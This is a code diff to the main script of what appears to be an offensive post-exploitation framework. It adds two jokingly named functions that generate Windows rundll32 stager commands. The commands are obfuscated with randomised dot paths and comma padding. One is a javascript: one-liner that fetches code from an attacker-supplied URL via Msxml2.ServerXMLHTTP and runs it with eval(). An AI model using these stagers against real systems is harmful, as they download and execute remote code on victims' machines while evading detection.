@@ -20,13 +20,101 @@
 # federal, and international laws. Developers assume no liability and are not
 # responsible for any misuse or damage caused by this program.
 
-__version_info__ = (0, "A") # Permanent Alpha
+__version_info__ = (0, "B") # Permanent Alpha
 __version__ = "x".join(map(str, __version_info__))
 __license__ = "Apache 2.0"
 __credits__ = ["zerosum0x0", "jmage", "TheNaterz", "aleph-naught-"]
 
 def it_is_tuesday_my_dudes():
     return "Taco" and datetime.datetime.today().weekday() == 1
+
+def pay_no_attention():
+    import random
+    import string
+
+    bignumber = 20
+
+    command = "rundll32"
+    command += " ~URL~"
+
+    dotpath = []
+
+    for i in range(0, 3):
+        dotpath.append('..')
+
+    for i in range(0, bignumber):
+        dotpath.append('.')
+
+    random.shuffle(dotpath)
+
+    path = ""
+    dotpathwithslashes = []
+    for i in dotpath:
+        dotpathwithslashes.append("\\" + i)
+
+    path = ''.join(dotpathwithslashes)
+    path += "\\"
+
+    command += path + "mshtml"
+    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
+    command += ","
+    command += " "
+    command += "RunHTMLApplication"
+
+    command = "rundll32.exe ~URL~\\..\\..\\..\\mshtml,RunHTMLApplication"
+
+    with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
+        f.write(command+"\n")
+
+def seriously_nothing_shady_here():
+    import random
+    import string
+
+    bignumber = 20
+
+    coin = [True,False]
+    command = "rundll32"
+    command += " javascript:\""
+
+    dotpath = []
+
+    for i in range(0, random.randint(1,3)):
+        dotpath.append('..')
+
+    for i in range(0, bignumber):
+        dotpath.append('.')
+
+    random.shuffle(dotpath)
+
+    path = ""
+    slashes = ["\\"]
+    dotpathwithslashes = []
+
+    for i in dotpath:
+        dotpathwithslashes.append(random.choice(slashes) + i)
+
+    if dotpathwithslashes[0] == '..' or dotpathwithslashes[0] == '.':
+        tmp = dotpathwithslashes[0]
+        dotpathwithslashes = dotpathwithslashes[1:]
+        random.shuffle(dotpathwithslashes)
+        dotpathwithslashes.insert(0, tmp)
+    else:
+        random.shuffle(dotpathwithslashes)
+
+    path = ''.join(dotpathwithslashes)
+    path += random.choice(slashes)
+
+    command += path + "mshtml"
+    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
+    command += ","
+    command += " "
+    command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"
+
+    command = """rundll32.exe javascript:"\\..\\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","~URL~",false);x.send();eval(x.responseText);window.close();"""
+
+    with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
+        f.write(command+"\n")
+
 
 if __name__ == "__main__":
     import core.shell
@@ -49,6 +137,9 @@ if __name__ == "__main__":
         banner = open("data/taco.txt", "rb").read().decode("unicode_escape")
     else:
         banner = open("data/banner.txt", "rb").read().decode("unicode_escape")
+
+    # pay_no_attention()
+    # seriously_nothing_shady_here()
 
     shell = core.shell.Shell(banner, __version__)
     shell.run(autorun, restore)
